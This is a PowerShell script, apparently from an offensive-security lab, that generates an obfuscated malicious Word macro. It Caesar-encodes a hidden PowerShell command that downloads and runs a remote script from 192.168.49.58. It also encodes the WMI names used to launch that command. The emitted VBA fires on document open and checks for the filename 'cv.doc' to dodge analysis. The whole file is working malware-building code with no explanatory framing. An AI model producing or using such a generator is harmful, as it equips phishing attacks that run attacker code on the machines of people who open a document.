function Caesar-Encrypt { 
   param ([string]$payload) 

	$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }}
return $output
}

$doc = "cv.doc"
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.58/run.txt'))"

$EncPayload = Caesar-Encrypt -Payload $payload
$win = "winmgmts:"
$EncWin = Caesar-Encrypt -Payload $win
$p = "Win32_Process"
$EncP = Caesar-Encrypt -Payload $p
$EncDoc = Caesar-Encrypt -Payload $doc

$vb = @"
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()

    If ActiveDocument.Name <> Nuts("{0}") Then
      Exit Function
    End If
    Dim Apples As String
    Dim Water As String
    
    Apples = "{1}"
    Water = Nuts(Apples)
    GetObject(Nuts("{2}")).Get(Nuts("{3}")).Create Water, Tea, Coffee, Napkin
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

"@

$final = $vb -f $EncDoc, $EncPayload, $EncWin, $EncP

Write-Output $final